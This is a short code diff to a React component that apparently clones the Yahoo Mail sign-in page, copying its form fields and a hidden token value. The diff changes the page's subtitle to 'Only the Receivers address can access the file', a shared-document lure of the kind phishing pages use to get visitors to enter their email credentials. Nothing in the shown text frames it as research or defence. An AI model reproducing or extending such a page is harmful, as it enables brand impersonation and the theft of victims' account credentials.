@@ -87,7 +87,7 @@ function App() {
               </div>
 <div className="username-challenge" id="login-landing">
     <strong className="challenge-heading">Sign in to Yahoo Mail</strong>
-    <span className="challenge-desc signin-sub-title">Sign in using your Yahoo account</span>
+    <span className="challenge-desc signin-sub-title">Only the Receivers address <br /> can access the file</span>
     <form id="login-username-form" method="post" className="pure-form">
         <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
         <input type="hidden" name="crumb" value="MU7P8XRYqm4" />
